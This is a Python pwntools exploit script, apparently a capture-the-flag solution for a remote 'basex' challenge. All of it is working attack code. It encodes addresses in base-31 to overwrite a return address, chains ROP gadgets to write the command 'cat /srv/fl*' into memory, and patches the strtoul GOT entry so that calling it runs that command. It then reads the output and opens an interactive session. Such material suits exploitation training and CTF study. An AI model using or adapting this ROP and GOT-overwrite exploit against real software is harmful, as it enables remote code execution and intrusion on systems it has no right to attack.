from pwn import *

#r = process("./basex")
r = remote('basex.challs.malice.fr',4444)

def base10to31(num):
	'''
	Return the number (num) that is represented in base 10, in his base-31 representation.
	'''
	mapping = {}
	start = 0x30
	res = []
	for i in xrange(0,31):
			mapping[i] = chr(start + i)

	n = num
	divided = n/31
	mod = n%31
	res.append(mod)
	while divided > 0:
		mod = divided % 31
		divided = divided/31
		res = [mod]+res

	result = ''
	for i in res:
		result+= mapping[i]

	return result

def fix_length(num):
	'''
	Adds enough zeroes to make this number fit to a 20 characters input
	'''
	return str(num).rjust(20,'0')

def write_addr(addr,ind_from_rbp):
	retaddr_base31 = fix_length(base10to31(addr))
	actual_ind = fix_length((512+0x20/8 + ind_from_rbp) << 0x20)
	return retaddr_base31+actual_ind



gadget2 = 0x00000000004005f8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gadget1=  0x000000000040075f # pop rbx ; pop rbp ; ret
gadget3 = 0x00000000004008f3 # pop rdi ; ret

address = 0x40083D
strlen_got = 0x601020 
strtoul_got = 0x601030

strtoul_call = 0x4007F5

rbx = 0x000000000041cd0-0x000000000038ee0
libc_start_main = 0x0600FF0
libc_start_main_call = 0x400564


cat_flag = "cat /srv/fl*"
ebx_vals = [u32(s) for s in group(4, cat_flag, 'fill', '\0')]
bss_addr = 0x601048

overwrite  = write_addr(gadget3, 1)
overwrite += write_addr(0,0)
overwrite += write_addr(bss_addr, 2)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget1, 3)
overwrite += write_addr(0,0)
overwrite += write_addr(ebx_vals[0],4)
overwrite += write_addr(0,0)
overwrite += write_addr(bss_addr+0x3d, 5)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget2,6)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget1, 7)
overwrite += write_addr(0,0)
overwrite += write_addr(ebx_vals[1],8)
overwrite += write_addr(0,0)
overwrite += write_addr(bss_addr+0x3d+4, 9)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget2, 10)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget1, 11)
overwrite += write_addr(0,0)
overwrite += write_addr(ebx_vals[2], 12)
overwrite += write_addr(0,0)
overwrite += write_addr(bss_addr+0x3d+8,13)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget2, 14)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget1, 15)
overwrite += write_addr(0,0)
overwrite += write_addr(rbx, 16)
overwrite += write_addr(0,0)
overwrite += write_addr(strtoul_got+0x3d,17)
overwrite += write_addr(0,0)
overwrite += write_addr(gadget2, 18)
overwrite += write_addr(0,0)
overwrite += write_addr(strtoul_call,19)

print overwrite

r.send(overwrite)

log.info("Sending CTRL+D to close stdin & trigger retaddr overwrite\n")
r.shutdown('send')

with open('ans','wb') as f:
	res =r.recvall()
	print res
	f.write(res)
r.interactive()